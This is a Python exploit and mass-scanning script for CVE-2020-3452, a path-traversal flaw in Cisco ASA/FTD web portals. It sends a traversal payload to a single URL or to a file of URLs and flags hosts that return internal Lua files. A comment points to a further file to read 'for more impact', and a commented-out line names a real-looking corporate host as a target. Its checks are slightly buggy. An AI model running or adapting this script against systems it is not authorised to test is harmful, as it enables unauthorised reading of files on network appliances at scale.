#!/usr/bin/python3
try:
    import requests
    from termcolor import colored
    import argparse
except:
    import requirements
#disable_warnings once for all
requests.packages.urllib3.disable_warnings() 

# Read this file for more impact: /+CSCOE+/files/file_list.json
payload_url = r"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"

headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"}


def req(url):
    print(colored("[*]Running....", "yellow"))
    final_url = url + payload_url
    try:
        r = requests.get(final_url, headers=headers, verify=False)
    #print(r.text)
    except: 
        print(colored("[Host unreachable]", "blue"))

    if r.status_code == 200 and "dofile" and "common.lua" in r.text:
        print(colored(f"[Vulnerable]", "red"), end = ' ')
        print(url)
    else:
        print(colored("[Not Vulnerable]", "green"))
        #print(url)

def from_file(filename):
    #print(colored("[*]Running....", "yellow"))
    try:
        with open(filename, 'r') as f:
            urls = f.read().strip().split()
    except:
        print(colored("File not found", "red"))
        exit(-1)
    
    # print(urls)
    for url in urls:
        req(url)


def main():
    #url = urls[1] + payload_url
    #print(url)
    #url = "https://globalras.eu.sony.com" + payload_url

    parser = argparse.ArgumentParser(description = "CVE-2020-3452 Vulnerability Test")

    parser.add_argument("-u", type=str, help="url to exploit")
    parser.add_argument("-f", type=str, help="pass the file containing urls")
    args = parser.parse_args()

    if(args.f and not(args.u)):
        from_file(args.f)
    if(args.u and not(args.f)):
        req(args.u)
    

if __name__ == '__main__':
    main()